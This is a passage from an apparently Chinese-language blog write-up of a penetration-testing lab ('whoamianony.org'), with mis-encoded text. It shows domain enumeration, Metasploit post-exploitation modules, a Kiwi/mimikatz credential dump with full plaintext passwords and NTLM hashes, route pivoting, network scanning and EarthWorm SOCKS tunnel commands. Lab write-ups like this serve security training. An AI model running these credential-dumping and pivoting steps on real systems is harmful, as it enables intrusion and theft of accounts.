/domain net group <span class="token string">"domain computers"</span> /domain The request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="12ï¼‰net-group-â€œdomain-controllersâ€-domain-æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ï¼ˆå¯èƒ½æœ‰å¤šå°ï¼‰"><a href="#12ï¼‰net-group-â€œdomain-controllersâ€-domain-æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ï¼ˆå¯èƒ½æœ‰å¤šå°ï¼‰" class="headerlink" title="12ï¼‰net group â€œdomain controllersâ€ /domain  æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ï¼ˆå¯èƒ½æœ‰å¤šå°ï¼‰"></a>12ï¼‰net group â€œdomain controllersâ€ /domain  æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ï¼ˆå¯èƒ½æœ‰å¤šå°ï¼‰</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net group <span class="token string">"domain controllers"</span> /domain  net group <span class="token string">"domain controllers"</span> /domain  The request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>æ”¶é›†åˆ°çš„ä¿¡æ¯éå¸¸å°‘ï¼Œä½†æ˜¯å»é¶åœºä¸»æœºä¸Šæ‰§è¡Œæ˜¯å¯ä»¥æ”¶é›†åˆ°ç›¸åº”çš„åŸŸä¿¡æ¯çš„ï¼Œå¯èƒ½è¿˜æ˜¯meterpreterçš„æƒé™ä¸å¤Ÿã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2015.40.24.png" style="zoom:70%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2015.42.47.png" style="zoom:80%;"><h3 id="8-5-4-åŸºäºmsfçš„åæ¸—é€æ¨¡å—æ”¶é›†åŸŸä¿¡æ¯"><a href="#8-5-4-åŸºäºmsfçš„åæ¸—é€æ¨¡å—æ”¶é›†åŸŸä¿¡æ¯" class="headerlink" title="8.5.4 åŸºäºmsfçš„åæ¸—é€æ¨¡å—æ”¶é›†åŸŸä¿¡æ¯"></a>8.5.4 åŸºäºmsfçš„åæ¸—é€æ¨¡å—æ”¶é›†åŸŸä¿¡æ¯</h3><h4 id="1ï¼‰è·å–ç™»é™†ç”¨æˆ·çš„SID"><a href="#1ï¼‰è·å–ç™»é™†ç”¨æˆ·çš„SID" class="headerlink" title="1ï¼‰è·å–ç™»é™†ç”¨æˆ·çš„SID"></a>1ï¼‰è·å–ç™»é™†ç”¨æˆ·çš„SID</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter<span class="token operator">&gt;</span> run post/windows/gather/enum_logged_on_users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> run post/windows/gather/enum_logged_on_users <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running against session <span class="token number">1102</span>Current Logged Users<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> SID                                             User ---                                             ---- S-1-5-18                                        NT AUTHORITY<span class="token punctuation">\</span>SYSTEM S-1-5-21-1315137663-3706837544-1429009142-1112  WHOAMIANONY<span class="token punctuation">\</span>bunny S-1-5-21-1315137663-3706837544-1429009142-500   WHOAMIANONY<span class="token punctuation">\</span>Administrator<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Results saved in: /root/.msf4/loot/20250117030327_default_192.168.52.30_host.users.activ_551562.txtRecently Logged Users<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> SID                                             Profile Path ---                                             ------------ S-1-5-18                                        %systemroot%<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>config<span class="token punctuation">\</span>systemprofile S-1-5-19                                        C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>ServiceProfiles<span class="token punctuation">\</span>LocalService S-1-5-20                                        C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>ServiceProfiles<span class="token punctuation">\</span>NetworkService S-1-5-21-1315137663-3706837544-1429009142-1112  C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>bunny S-1-5-21-1315137663-3706837544-1429009142-500   C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>administrator.WHOAMIANONY S-1-5-21-1982601180-2087634876-2293013296-1000  C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>liukaifeng01 S-1-5-21-2952760202-1353902439-2381784089-500   C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ç”¨æˆ·æœ‰ï¼šNT AUTHORITY\SYSTEMã€WHOAMIANONY\bunnyã€WHOAMIANONY\Administrator ä¸‰ä¸ªç”¨æˆ·ã€‚</p><p>ç¬¬ä¸€ä¸ªé€šè¿‡meterpreterç™»å½•çš„ç”¨æˆ·ï¼ŒWHOAMIANONY\Administrator æ˜¯åŸŸç®¡ç†å‘˜ã€‚</p><h4 id="2ï¼‰è·å–åŸŸæ§ä¿¡æ¯åŠåŸŸå†…ä¸»æœºä¿¡æ¯"><a href="#2ï¼‰è·å–åŸŸæ§ä¿¡æ¯åŠåŸŸå†…ä¸»æœºä¿¡æ¯" class="headerlink" title="2ï¼‰è·å–åŸŸæ§ä¿¡æ¯åŠåŸŸå†…ä¸»æœºä¿¡æ¯"></a>2ï¼‰è·å–åŸŸæ§ä¿¡æ¯åŠåŸŸå†…ä¸»æœºä¿¡æ¯</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run post/windows/gather/enum_domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2016.08.39.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°åŸŸæ§æ˜¯192.168.93.30.</p><h4 id="3ï¼‰åŸŸå†…æ‰€æœ‰æœºå™¨"><a href="#3ï¼‰åŸŸå†…æ‰€æœ‰æœºå™¨" class="headerlink" title="3ï¼‰åŸŸå†…æ‰€æœ‰æœºå™¨"></a>3ï¼‰åŸŸå†…æ‰€æœ‰æœºå™¨</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run post/windows/gather/enum_ad_computers <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> run post/windows/gather/enum_ad_computers <span class="token punctuation">[</span>-<span class="token punctuation">]</span> extapi_adsi_domain_query: Operation failed: <span class="token number">2147943726</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ç›®å‰æŒæ¡çš„å‡ ä¸ªå…³é”®ä¿¡æ¯ï¼š</p><ul><li><p>åŸŸï¼šwhoamianony.org</p></li><li><p>åŸŸæ§ï¼š192.168.93.30 </p></li><li><p>åŸŸæ§ä¸»æœºåï¼šDC.whoamianony.org</p></li><li><p>åŸŸç®¡ç†å‘˜ï¼šAdministrator</p></li></ul><h1 id="ä¹ã€kiwiæŠ“å–åŸŸç”¨æˆ·å¯†ç "><a href="#ä¹ã€kiwiæŠ“å–åŸŸç”¨æˆ·å¯†ç " class="headerlink" title="ä¹ã€kiwiæŠ“å–åŸŸç”¨æˆ·å¯†ç "></a>ä¹ã€kiwiæŠ“å–åŸŸç”¨æˆ·å¯†ç </h1><h2 id="7-1-åŠ è½½kiwi"><a href="#7-1-åŠ è½½kiwi" class="headerlink" title="7.1 åŠ è½½kiwi"></a>7.1 åŠ è½½kiwi</h2><p>Kiwi æ˜¯ Metasploit æ¡†æ¶ä¸­çš„ä¸€ä¸ªæ¨¡å—ï¼Œå®ƒæ˜¯ä¸€ä¸ªç±»ä¼¼äºmimikatzçš„å·¥å…·ï¼Œä½†æ¯”mimikatzæ›´å¼ºå¤§ã€‚Kiwiæ¨¡å—èƒ½å¤Ÿä»Windowsç³»ç»Ÿä¸­æå–å¤šç§å‡­æ®ä¿¡æ¯ï¼ŒåŒ…æ‹¬å“ˆå¸Œå€¼ã€æ˜æ–‡å¯†ç ç­‰ã€‚å®ƒèƒ½å¤Ÿä»å¤šç§æ¥æºè·å–è¿™äº›æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚LSASSï¼ˆæœ¬åœ°å®‰å…¨æƒé™æœåŠ¡ï¼‰è¿›ç¨‹ã€æ³¨å†Œè¡¨ã€ä»¥åŠåŸŸæ§åˆ¶å™¨çš„å†…å­˜ç­‰ã€‚åŠ è½½kiwiæ¨¡å—åï¼Œå¯ä»¥ä½¿ç”¨<code>kiwi_cmd</code>å‘½ä»¤æ¥æå–å‡­æ®ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œmimikatzæ¨¡å—å·²ç»åˆå¹¶ä¸ºkiwiæ¨¡å—ï¼Œå¯ä»¥ä½¿ç”¨<code>mimikatz_command</code>å‘½ä»¤è·å–æ˜æ–‡å¯†ç ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2016.29.15.png" style="zoom:50%;"><h2 id="7-2-æŠ“å–ç”¨æˆ·å£ä»¤"><a href="#7-2-æŠ“å–ç”¨æˆ·å£ä»¤" class="headerlink" title="7.2 æŠ“å–ç”¨æˆ·å£ä»¤"></a>7.2 æŠ“å–ç”¨æˆ·å£ä»¤</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kiwi_cmd privilege::debugkiwi_cmd sekurlsa::logonPasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2016.33.52.png" style="zoom:50%;"><p>æŠ“å–åˆ°çš„ç”¨æˆ·å‡­è¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> kiwi_cmd sekurlsa::logonPasswordsAuthentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">1573149</span> <span class="token punctuation">(</span>00000000:0018011d<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> CachedInteractive from <span class="token number">1</span>User Name         <span class="token builtin class-name">:</span> AdministratorDomain            <span class="token builtin class-name">:</span> WHOAMIANONYLogon Server      <span class="token builtin class-name">:</span> DCLogon Time        <span class="token builtin class-name">:</span> <span class="token number">2024</span>/12/31 <span class="token number">17</span>:49:38SID               <span class="token builtin class-name">:</span> S-1-5-21-1315137663-3706837544-1429009142-500        msv <span class="token builtin class-name">:</span>         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         * Username <span class="token builtin class-name">:</span> Administrator         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * LM       <span class="token builtin class-name">:</span> 56b0cd8b125c05055e2dd9e955f18034         * NTLM     <span class="token builtin class-name">:</span> ab89b1295e69d353dd7614c7a3a80cec         * SHA1     <span class="token builtin class-name">:</span> 2bc4124300a6a8fc0ca10891823d36c64e4b3a40        tspkg <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> Administrator         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * Password <span class="token builtin class-name">:</span> Whoami2021        wdigest <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> Administrator         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * Password <span class="token builtin class-name">:</span> Whoami2021        kerberos <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> Administrator         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY.ORG         * Password <span class="token builtin class-name">:</span> Whoami2021        ssp <span class="token builtin class-name">:</span>        credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">1338474</span> <span class="token punctuation">(</span>00000000:00146c6a<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> Interactive from <span class="token number">1</span>User Name         <span class="token builtin class-name">:</span> bunnyDomain            <span class="token builtin class-name">:</span> WHOAMIANONYLogon Server      <span class="token builtin class-name">:</span> DCLogon Time        <span class="token builtin class-name">:</span> <span class="token number">2024</span>/12/31 <span class="token number">17</span>:47:43SID               <span class="token builtin class-name">:</span> S-1-5-21-1315137663-3706837544-1429009142-1112        msv <span class="token builtin class-name">:</span>         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         * Username <span class="token builtin class-name">:</span> bunny         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * LM       <span class="token builtin class-name">:</span> 7de10bf327ef7f2ac6ebe8776a153feb         * NTLM     <span class="token builtin class-name">:</span> cc567d5556030b7356ee4915ff098c8f         * SHA1     <span class="token builtin class-name">:</span> 3747632756191e3350e53211c63f804eb163638f        tspkg <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> bunny         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * Password <span class="token builtin class-name">:</span> Bunny2021        wdigest <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> bunny         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * Password <span class="token builtin class-name">:</span> Bunny2021        kerberos <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> bunny         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY.ORG         * Password <span class="token builtin class-name">:</span> Bunny2021        ssp <span class="token builtin class-name">:</span>        credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">997</span> <span class="token punctuation">(</span>00000000:000003e5<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> Service from <span class="token number">0</span>User Name         <span class="token builtin class-name">:</span> LOCAL SERVICEDomain            <span class="token builtin class-name">:</span> NT AUTHORITYLogon Server      <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2024</span>/12/31 <span class="token number">17</span>:43:54SID               <span class="token builtin class-name">:</span> S-1-5-19        msv <span class="token builtin class-name">:</span>        tspkg <span class="token builtin class-name">:</span>        wdigest <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>         * Domain   <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>         * Password <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>         * Domain   <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>         * Password <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp <span class="token builtin class-name">:</span>        credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">996</span> <span class="token punctuation">(</span>00000000:000003e4<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> Service from <span class="token number">0</span>User Name         <span class="token builtin class-name">:</span> PC1$Domain            <span class="token builtin class-name">:</span> WHOAMIANONYLogon Server      <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2024</span>/12/31 <span class="token number">17</span>:43:54SID               <span class="token builtin class-name">:</span> S-1-5-20        msv <span class="token builtin class-name">:</span>         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         * Username <span class="token builtin class-name">:</span> PC1$         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * NTLM     <span class="token builtin class-name">:</span> 3e6a3d8c713b4821eaa51aab25f52074         * SHA1     <span class="token builtin class-name">:</span> d8e1318a24c64b8fcc89dc8609b09af50342bacf        tspkg <span class="token builtin class-name">:</span>        wdigest <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> PC1$         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * Password <span class="token builtin class-name">:</span> %Yn<span class="token operator">!</span>@ZW,eWz<span class="token operator"><span class="token file-descriptor important">5</span>&gt;</span><span class="token punctuation">[</span><span class="token operator">!</span>hh<span class="token punctuation">;</span>H.<span class="token punctuation">(</span><span class="token operator">&amp;</span>n<span class="token punctuation">(</span>yh^2YADmU*2bVx<span class="token operator">&lt;</span>N<span class="token comment">#yvw.9MTwmi;84''uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/"$V6?sDZel=f&gt;[ol;</span>        kerberos <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> pc1$         * Domain   <span class="token builtin class-name">:</span> whoamianony.org         * Password <span class="token builtin class-name">:</span> %Yn<span class="token operator">!</span>@ZW,eWz<span class="token operator"><span class="token file-descriptor important">5</span>&gt;</span><span class="token punctuation">[</span><span class="token operator">!</span>hh<span class="token punctuation">;</span>H.<span class="token punctuation">(</span><span class="token operator">&amp;</span>n<span class="token punctuation">(</span>yh^2YADmU*2bVx<span class="token operator">&lt;</span>N<span class="token comment">#yvw.9MTwmi;84''uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/"$V6?sDZel=f&gt;[ol;</span>        ssp <span class="token builtin class-name">:</span>        credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">50033</span> <span class="token punctuation">(</span>00000000:0000c371<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> UndefinedLogonType from <span class="token number">0</span>User Name         <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Domain            <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Server      <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2024</span>/12/31 <span class="token number">17</span>:43:54SID               <span class="token builtin class-name">:</span>         msv <span class="token builtin class-name">:</span>         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         * Username <span class="token builtin class-name">:</span> PC1$         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * NTLM     <span class="token builtin class-name">:</span> 3e6a3d8c713b4821eaa51aab25f52074         * SHA1     <span class="token builtin class-name">:</span> d8e1318a24c64b8fcc89dc8609b09af50342bacf        tspkg <span class="token builtin class-name">:</span>        wdigest <span class="token builtin class-name">:</span>        kerberos <span class="token builtin class-name">:</span>        ssp <span class="token builtin class-name">:</span>        credman <span class="token builtin class-name">:</span>Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">999</span> <span class="token punctuation">(</span>00000000:000003e7<span class="token punctuation">)</span>Session           <span class="token builtin class-name">:</span> UndefinedLogonType from <span class="token number">0</span>User Name         <span class="token builtin class-name">:</span> PC1$Domain            <span class="token builtin class-name">:</span> WHOAMIANONYLogon Server      <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2024</span>/12/31 <span class="token number">17</span>:43:54SID               <span class="token builtin class-name">:</span> S-1-5-18        msv <span class="token builtin class-name">:</span>        tspkg <span class="token builtin class-name">:</span>        wdigest <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> PC1$         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY         * Password <span class="token builtin class-name">:</span> %Yn<span class="token operator">!</span>@ZW,eWz<span class="token operator"><span class="token file-descriptor important">5</span>&gt;</span><span class="token punctuation">[</span><span class="token operator">!</span>hh<span class="token punctuation">;</span>H.<span class="token punctuation">(</span><span class="token operator">&amp;</span>n<span class="token punctuation">(</span>yh^2YADmU*2bVx<span class="token operator">&lt;</span>N<span class="token comment">#yvw.9MTwmi;84''uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/"$V6?sDZel=f&gt;[ol;</span>        kerberos <span class="token builtin class-name">:</span>         * Username <span class="token builtin class-name">:</span> pc1$         * Domain   <span class="token builtin class-name">:</span> WHOAMIANONY.ORG         * Password <span class="token builtin class-name">:</span> %Yn<span class="token operator">!</span>@ZW,eWz<span class="token operator"><span class="token file-descriptor important">5</span>&gt;</span><span class="token punctuation">[</span><span class="token operator">!</span>hh<span class="token punctuation">;</span>H.<span class="token punctuation">(</span><span class="token operator">&amp;</span>n<span class="token punctuation">(</span>yh^2YADmU*2bVx<span class="token operator">&lt;</span>N<span class="token comment">#yvw.9MTwmi;84''uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/"$V6?sDZel=f&gt;[ol;</span>        ssp <span class="token builtin class-name">:</span>        credman <span class="token builtin class-name">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…³é”®ä¿¡æ¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">* Username <span class="token builtin class-name">:</span> Administrator* Domain   <span class="token builtin class-name">:</span> WHOAMIANONY* Password <span class="token builtin class-name">:</span> Whoami2021<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">* Username <span class="token builtin class-name">:</span> bunny* Domain   <span class="token builtin class-name">:</span> WHOAMIANONY* Password <span class="token builtin class-name">:</span> Bunny2021<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸæŠ“å–åˆ°åŸŸç”¨æˆ·bunnyå’ŒåŸŸç®¡ç†å‘˜administratorçš„å‡­è¯ï¼š</p><ul><li><p>bunnyï¼šBunny2021</p></li><li><p>administratorï¼šWhoami2021</p></li></ul><h1 id="åã€ä¸‰å±‚ç½‘ç»œéš§é“æ­å»º"><a href="#åã€ä¸‰å±‚ç½‘ç»œéš§é“æ­å»º" class="headerlink" title="åã€ä¸‰å±‚ç½‘ç»œéš§é“æ­å»º"></a>åã€ä¸‰å±‚ç½‘ç»œéš§é“æ­å»º</h1><h2 id="10-1-æ·»åŠ meterpreterè·¯ç”±"><a href="#10-1-æ·»åŠ meterpreterè·¯ç”±" class="headerlink" title="10.1 æ·»åŠ meterpreterè·¯ç”±"></a>10.1 æ·»åŠ meterpreterè·¯ç”±</h2><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.29.16.png" style="zoom:50%;"><p>å°†msfconsoleçš„æµé‡é€šè¿‡session2è·¯ç”±åˆ°192.168.93.0ç½‘æ®µã€‚ä¸‹é¢å¯ä»¥ä½¿ç”¨msfåšä¸‰å±‚ç½‘ç»œçš„ä¿¡æ¯æ¢æµ‹ã€‚</p><ul><li>ä¸‰å±‚ç½‘ç»œä¸»æœºå‘ç°</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/discovery/udp_probe<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.93.0/24<span class="token builtin class-name">set</span> threads <span class="token number">50</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.35.05.png" style="zoom:50%;"><p>å‘ç°çš„ipï¼š192.168.93.20ã€192.168.93.30ã€192.168.93.40</p><h2 id="10-2-EWéš§é“æ­å»º"><a href="#10-2-EWéš§é“æ­å»º" class="headerlink" title="10.2 EWéš§é“æ­å»º"></a>10.2 EWéš§é“æ­å»º</h2><p>è·¯ç”±è½¬å‘åªèƒ½å°†msfconsoleå¸¦è¿›å†…ç½‘ï¼Œè€Œè¦æƒ³å°†æ”»å‡»æœºä¸Šçš„å…¶ä»–æ”»å‡»ç¨‹åºä¹Ÿå¸¦è¿›å†…ç½‘è¿˜éœ€è¦æ­å»ºsocksä»£ç†ã€‚æˆ‘ä»¬ä½¿ç”¨earthwormæ­å»ºä¸€ä¸ªäºŒçº§socks5ä»£ç†æœåŠ¡ã€‚</p><h3 id="10-2-1-æ”»å‡»æœº"><a href="#10-2-1-æ”»å‡»æœº" class="headerlink" title="10.2.1 æ”»å‡»æœº"></a>10.2.1 æ”»å‡»æœº</h3><p>é¦–å…ˆæ”»å‡»æœºä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æ·»åŠ ä¸€ä¸ªè½¬æ¥éš§é“ï¼Œç›‘å¬1090ç«¯å£ï¼Œå¹¶å°†1090ç«¯å£æ”¶åˆ°çš„ä»£ç†è¯·æ±‚å‘é€ç»™1235ç«¯å£ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> lcx_listen <span class="token parameter variable">-l</span> <span class="token number">1090</span> <span class="token parameter variable">-e</span> <span class="token number">1235</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.51.07.png" style="zoom:40%;"><h3 id="10-2-2-äºŒå±‚ç½‘ç»œçš„webæœåŠ¡å™¨"><a href="#10-2-2-äºŒå±‚ç½‘ç»œçš„webæœåŠ¡å™¨" class="headerlink" title="10.2.2 äºŒå±‚ç½‘ç»œçš„webæœåŠ¡å™¨"></a>10.2.2 äºŒå±‚ç½‘ç»œçš„webæœåŠ¡å™¨</h3><p>ç„¶ååœ¨ç¬¬äºŒå±‚ç½‘ç»œçš„WindowsæœåŠ¡å™¨ä¸Šä¼ ew_for_Win.exeï¼Œå¹¶åˆ©ç”¨ssocksdæ–¹å¼å¯åŠ¨999ç«¯å£çš„æ­£å‘socksä»£ç†ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ew_for_Win.exe <span class="token parameter variable">-s</span> ssocksd <span class="token parameter variable">-l</span> <span class="token number">999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2010.55.36.png" style="zoom:50%;"><img 